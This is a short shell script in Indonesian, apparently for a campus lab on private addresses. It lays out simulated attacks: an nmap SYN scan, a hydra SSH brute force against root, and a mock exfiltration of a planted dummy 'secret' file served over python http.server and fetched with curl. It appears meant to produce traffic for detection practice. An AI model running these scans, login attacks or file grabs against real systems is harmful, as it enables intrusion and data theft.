# A.
# Scan port 1 sampai 100 secara cepat ke Server Riset
nmap -sS -p 1-100 10.20.30.2

# B. 
# Mengirim banyak password sembarang ke user 'root'
hydra -l root -p password123 ssh://10.20.30.2 -t 4
# Kalo tidak ada hydra, ketik ini manual 5-6 kali dengan cepat:
# ssh root@10.20.30.10 (lalu Ctrl+C, ulangi lagi)

# C.
#Serangan Pencurian Data (Exfiltration) Pastikan di Server Riset (10.20.30.2) sudah ada file dummy dulu: (Lakukan ini di Server Riset)
echo "DOKUMEN RAHASIA NEGARA" > /var/www/html/rahasia.txt
# (Pastikan web server/python http.server jalan di port 80)
python3 -m http.server 80
# (Kembali ke PC Student, curi filenya)
curl http://10.20.30.2/rahasia.txt

# C. Alternatif
# Matikan web server lama jika ada
pkill python3

# Buat folder dan file rahasia
mkdir -p /root/data_rahasia
cd /root/data_rahasia
echo "INI ADALAH DATA RAHASIA KAMPUS YANG SANGAT CONFIDENTIAL" > index.html

# Jalankan web server di port 80
python3 -m http.server 80 &

# Coba download file rahasia
curl http://10.20.30.10/index.html